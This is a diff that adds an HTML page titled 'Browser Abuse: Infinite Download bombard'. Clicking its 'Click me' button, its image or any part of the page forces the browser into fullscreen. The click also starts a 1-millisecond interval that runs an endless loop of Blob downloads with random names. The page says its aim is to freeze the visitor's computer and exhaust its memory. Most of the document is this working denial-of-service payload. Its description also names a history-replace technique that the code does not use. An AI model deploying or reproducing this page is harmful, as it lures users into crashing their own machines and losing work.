@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
+
+<style>
+	img {
+	    width: 100%;
+	    height: auto;
+	}
+</style>
+
+<script> 
+
+	function download(g, h, j) {
+		// https://developer.mozilla.org/en-US/docs/Web/API/Blob
+		var k = new Blob([g], { type: j });
+		var l = document.createElement("a"),
+				m = URL.createObjectURL(k);		
+				l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+	}
+
+	function bomb_character() {
+		var g = Math.random().toString(36).substring(20),
+				h = Math.floor(50 * Math.random() + 25);
+		while (true) download(h, g, g)
+	}
+
+
+	function intervalCall() {
+	  setInterval(function(){ 
+	    bomb_character(); }, 1);
+
+	}
+
+	function requestFullScreen() {
+	  var element = document.body;
+
+	  // Supports: IE, Firefox, Safari, Chrome, Opera and most browsers
+	  // https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullScreen
+	  var request = element.requestFullScreen || element.webkitRequestFullScreen || element.mozRequestFullScreen || element.msRequestFullScreen;
+
+	  if (request) { // Native full screen 
+	    request.call(element);
+	  } else if (typeof window.ActiveXObject !== "undefined") { // Older IE
+	    var wscript = new ActiveXObject("WScript.Shell");
+
+	    if (wscript !== null) {
+	      wscript.SendKeys("{F11}");
+	    }
+	  }
+	  intervalCall();
+	}
+
+</script>
+</head>
+
+<body>
+
+<div onclick="requestFullScreen()">
+	<Strong>Browser Abuse: Infinite Download bombard </Strong>
+	<p> In this browser abuse, user clicks button or any part of the page, the page goes to full screen mode. </p>
+	<p> When user tries to get out of full screen mode, the infinite download freezes computer and creates memory hog </p>
+	<p> <Strong> Technique used:</Strong> Set interval with small timeframe less than a second, and history replace with long random digits or characters </p>
+	<input id="clickbutton" type="button" value="Click me" onclick="requestFullScreen()" /> <br /> <br /> <br /> 
+	<img src="infinity.png" onclick="requestFullScreen()"/ >
+</div>
+
+</body>
+</html>
